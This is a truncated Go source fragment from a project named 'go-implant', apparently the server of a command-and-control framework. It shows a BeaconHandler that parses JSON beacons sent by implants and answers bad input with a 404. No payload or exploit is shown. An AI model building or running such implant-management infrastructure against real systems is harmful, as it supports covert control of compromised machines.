package handler

import (
	"encoding/json"
	"fmt"
	"go-implant/common/communication"
	"go-implant/server/model"
	"log"
	"net/http"
	"time"

	"github.com/fatih/color"
)

// BeaconHandler handles incoming beacons
func BeaconHandler(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodPost:

		// decode the received json
		decoder := json.NewDecoder(r.Body)
		var t communication.Beacon
		err := decoder.Decode(&t)
		if err != nil {
			printError("Error parsing JSON")
			return404(w)
			r